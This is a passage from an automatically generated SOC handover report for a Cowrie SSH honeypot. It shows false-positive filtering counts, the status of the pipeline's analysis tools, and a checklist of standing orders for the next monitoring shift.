| [T1105](https://attack.mitre.org/techniques/T1105) | 29 |

---

## 🔕 False Positive Summary (31 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 29 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 177 cases |
| Tool 34  | Credential Extractor        | ✅ 146 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 20 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 31 filtered (17.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 15 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 58 priority case(s) shown individually · 15 recon entry/entries in table (7 group(s) consolidating 80 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-25T18:59:54Z_
